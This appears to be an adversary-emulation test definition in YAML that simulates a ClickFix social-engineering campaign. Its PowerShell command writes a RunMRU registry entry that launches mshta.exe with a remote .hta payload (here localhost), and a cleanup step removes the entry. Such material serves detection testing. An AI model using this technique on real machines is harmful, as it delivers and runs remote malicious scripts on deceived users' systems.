- requirements: []
  name: Soumaia ART Tests - ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell
  description: 'Simulates a ClickFix-style campaign by adding a malicious entry to the RunMRU registry key that launches `mshta.exe` with a remote payload.

    This technique relies on user interaction (Win+R + Enter) to trigger execution.

    Used in social engineering campaigns that aim to bypass traditional startup methods.

    Reference: https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection'
  tactic: execution
  technique_id: T1204.002
  technique_name: 'User Execution: Malicious File'
  executors:
  - cleanup:
    - Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -ErrorAction SilentlyContinue
    timeout: 60
    platform: windows
    name: psh
    payloads: []
    parsers: []
    command: Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
  id: 4d27fbd9-b4bd-55a3-828b-915664bdf5f4
